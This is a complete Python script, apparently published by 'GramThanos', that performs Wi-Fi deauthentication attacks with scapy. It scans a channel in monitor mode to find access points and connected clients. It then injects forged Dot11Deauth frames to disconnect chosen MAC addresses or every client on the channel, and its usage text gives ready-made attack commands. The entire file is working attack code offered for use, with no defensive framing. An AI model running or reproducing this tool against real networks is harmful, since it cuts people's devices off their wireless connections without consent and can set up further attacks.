#!/usr/bin/python3
#
# Wi-Fi DeAuth attack
# by GramThanos
# 
# Dependancies
# 	pip3 install scapy
# 	pip3 install mac-vendor-lookup

# Libraries
import os
import re
import sys
import getopt
import subprocess
import logging
from scapy.all import *
from mac_vendor_lookup import MacLookup

# Global Variables
VERBOSE = False
MACLOOKUP = None
INTERFACE_MONITOR = None
CHANNEL = None
SNIFF_MODE = 'SCAN'
ATTACK_ALL = False

access_points = []
victim_clients = []

# Instruct Scapy to use PCAP
#conf.use_pcap = True


''' Initialize Script
-----------------------------------'''

def initialize():
	global MACLOOKUP

	# Parse arguments
	parse_script_arguments()

	# Set up logging
	logging.basicConfig(
		level= logging.DEBUG if VERBOSE else logging.INFO,
		format='[ATK]' + '[%(levelname)s] %(message)s'
	)

	# Check if root
	if os.getuid() != 0:
		logging.error('Run the script as root');
		sys.exit(0)

	# Init MAC lookup
	MACLOOKUP = MacLookup()
	MACLOOKUP.load_vendors()

# Parse parameters
def parse_script_arguments():
	global VERBOSE, CHANNEL, SNIFF_MODE, ATTACK_ALL

	try:
		opts, args = getopt.getopt(sys.argv[1:], 'vhc:a:', ['verbose', 'help', 'channel=', 'attack='])
	except getopt.GetoptError as err:
		print(err)
		show_script_usage()
		sys.exit(2)

	for o, a in opts:
		# Print more info
		if o == '-v' or o == '--verbose':
			VERBOSE = True
		# Print help message
		elif o in ('-h', '--help'):
			show_script_usage()
			sys.exit()
		# Set channel to scan/attack
		elif o in ('-c', '--channel'):
			CHANNEL = int(a)
			if not (1 <= CHANNEL and CHANNEL <= 14):
				CHANNEL = None
		# MAC to attack
		elif o in ('-a', '--attack'):
			if a.lower() == '*':
				ATTACK_ALL = True
			elif validate_mac_address(a):
				victim_clients.append(a)
				SNIFF_MODE = 'ATTACK'
			else:
				assert False, "Invald MAC address to attack"
		else:
			assert False, "Unhandled option"

# Show help message
def show_script_usage():
	print(
		'Usage: sudo ./deauth.py [ARGUMENTS]...\n'
		'\n'
		'Optional arguments.\n'
		'  -v                         Run in verbose mode.\n'
		'  -h, --help                 Prints this message.\n'
		'  -c, --channel              Channel to monitor.\n'
		'  -a, --attack               Victim\'s MAC address.\n'
		'\n'
		'Example usage\n'
		'  Monitor channel 8 for victims:\n'
		'    sudo ./deauth.py -c 8\n'
		'  Attack all clients on channel 8:\n'
		'    sudo ./deauth.py -c 8 -a *\n'
		'  Attack clients by MAC on channel 8:\n'
		'    sudo ./deauth.py -c 8 -a AA:11:22:33:44:55 -a BB:11:22:33:44:55\n'
		'\n'
		'By GramThanos'
	)

''' Help Functions
-----------------------------------'''

def throw_error(error):
	if error:
		logging.critical(error)
	logging.critical('Failed!')
	sys.exit(1)

def run_command(command):
	if isinstance(command, str):
		return subprocess.run(command, shell=True, check=False, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
	else:
		return subprocess.run(command, check=False, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

def run_command_assert(command, error):
	logging.debug(command)
	result = run_command(command)
	if result.returncode != 0:
		throw_error(error)
	return result

def query_yes_no(question, default="yes"):
	"""
	https://stackoverflow.com/a/3041990/3709257
	Ask a yes/no question via input() and return their answer.
	"question" is a string that is presented to the user.
	"default" is the presumed answer if the user just hits <Enter>.
		It must be "yes" (the default), "no" or None (meaning
		an answer is required of the user).
	
	The "answer" return value is True for "yes" or False for "no".
	"""
	valid = {"yes": True, "y": True, "ye": True, "no": False, "n": False}
	if default is None:
		prompt = " [y/n] "
	elif default == "yes":
		prompt = " [Y/n] "
	elif default == "no":
		prompt = " [y/N] "
	else:
		raise ValueError("invalid default answer: '%s'" % default)

	while True:
		sys.stdout.write(question + prompt)
		choice = input().lower()
		if default is not None and choice == '':
			return valid[default]
		elif choice in valid:
			return valid[choice]
		else:
			sys.stdout.write("Please respond with 'yes' or 'no' (or 'y' or 'n').\n")

def query_number(question, num_from, num_to, default=-1):
	if default < num_from and num_to < default:
		raise ValueError("invalid default answer: '%s'" % str(default))
	prompt = " [" + str(num_from) + "-" + str(num_to) + ":" + str(default) + "] "

	while True:
		sys.stdout.write(question + prompt)
		choice = input()
		if default is not None and choice == '':
			return default
		choice = int(choice)
		if choice and choice >= num_from and choice <= num_to:
			return choice
		else:
			sys.stdout.write("Please respond with a number from " + str(num_from) + "-" + str(num_to) + ".\n")

# Display MAC and Vendor
def mac_and_ventor(mac):
	if mac is None:
		return 'None [ - ]'
	try:
		vendor = MACLOOKUP.lookup(mac)
	except KeyError as e:
		vendor = 'Unknown'
	return mac + ' [' + vendor + ']'

# Validate MAC address
def validate_mac_address(value):
	if re.match(r"^([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})$", value):
		return True
	return False



''' Interfaces Functions
-----------------------------------'''

# Get monitor interfaces
def get_monitor_interfaces():
	# Get all wireless interfaces
	result = run_command_assert('iwconfig', 'Failed to get wireless interfaces!')
	# Parse interfaces
	result = re.sub(r"\n\s+\n", "\n\n", result.stdout.decode('utf-8'))
	data = re.findall(r"(([a-zA-Z0-9]+)\s+(?:.+\n)+)", result)
	# For each result
	interfaces = []
	for interface in data:
		if re.search(r"\s+Mode:Monitor\s+", interface[0]) :
			interfaces.append(interface[1])
	
	# Return interfaces
	return interfaces

# Select monitor interface
def select_monitor_interface():
	# Get all monitor interfaces
	interfaces = get_monitor_interfaces()

	# Not monitor interface
	if (len(interfaces) == 0) :
		throw_error('No interface found in monitor mode!');

	# More than one
	if (len(interfaces) > 1) :
		logging.info('Selecting the first interface in monitor mode')

	logging.info('Interface "%s" selected' % interfaces[0])
	return interfaces[0]

# Set monitor channel
def set_monitor_channel(interface, channel):
	# Change channel
	result = run_command('iwconfig %s channel %d' % (interface, channel))
	if result.returncode != 0:
		logging.error('Failed to set channel %d on interface "%s"' % (channel, interface))

		# Ask to try again
		if query_yes_no('Do you want to reset the interface "%s"?' % interface, 'yes'):
			# Reset interface
			run_command_assert(
				'ifconfig %s down && ifconfig %s up' % (interface, interface),
				'Failed to reset interface "%s"' % interface
			)
			# Try again
			run_command_assert(
				'iwconfig %s channel %d' % (interface, channel),
				'Failed to set channel %d on interface "%s"' % (channel, interface)
			)
		else:
			throw_error('Cancel')
	
	logging.info('Channel was set to %d' % channel)



''' Packet Functions
-----------------------------------'''

# Scan mode - List Devices using the channel
def sniffer_handler_scan(packet):
	# Get layer info
	layer = packet.getlayer(Dot11)
	
	# Record any beacon access point
	if packet.haslayer(Dot11Beacon) and layer.addr2 not in access_points:
		access_points.append(layer.addr2)
		logging.info('Detected AP     : "%s" - %s' % (packet.getlayer(Dot11Elt).info.decode('UTF-8'), mac_and_ventor(layer.addr2)))
	
	# Filter packages from the victim to the access point
	elif layer.addr2 is not None and layer.addr2 not in victim_clients and layer.addr1 in access_points:
		victim_clients.append(layer.addr2)
		logging.info('Detected victim : %s' % (mac_and_ventor(layer.addr2)))

# Attack mode - Send DeAuth packets to victim devices
ATTACK_COUNTER = 0
def sniffer_handler_attack(packet):
	global ATTACK_COUNTER

	# Get layer info
	layer = packet.getlayer(Dot11)
	
	# Record any beacon access point
	if packet.haslayer(Dot11Beacon) and layer.addr2 not in access_points:
		access_points.append(layer.addr2)
		logging.info('Detected AP : "%s" - %s' % (packet.getlayer(Dot11Elt).info.decode('UTF-8'), mac_and_ventor(layer.addr2)))
	
	# Filter packages from the victim to the access point
	elif ((ATTACK_ALL == True and layer.addr2 is not None) or layer.addr2 in victim_clients) and layer.addr1 in access_points:
		ATTACK_COUNTER = ATTACK_COUNTER + 1
		logging.info('Deauth      : [%d] %s' % (ATTACK_COUNTER, mac_and_ventor(layer.addr2)))
		inject = RadioTap()/Dot11(addr1=layer.addr2,addr2=layer.addr1,addr3=layer.addr1)/Dot11Deauth(reason=7)
		sendp(inject, iface=INTERFACE_MONITOR, count=10, verbose=False)



''' Execution
-----------------------------------'''
if __name__ == "__main__":
	# Initialize script
	initialize()
	# Get an interface
	INTERFACE_MONITOR = select_monitor_interface()
	# Set channel
	if CHANNEL is None:
		CHANNEL = query_number('Select channel to monitor', 1, 14, default=1)
	set_monitor_channel(INTERFACE_MONITOR, CHANNEL)

	# Start monitoring
	handler = \
		sniffer_handler_attack if SNIFF_MODE == 'ATTACK' else\
		sniffer_handler_scan
	sniff(iface=INTERFACE_MONITOR, prn=handler)
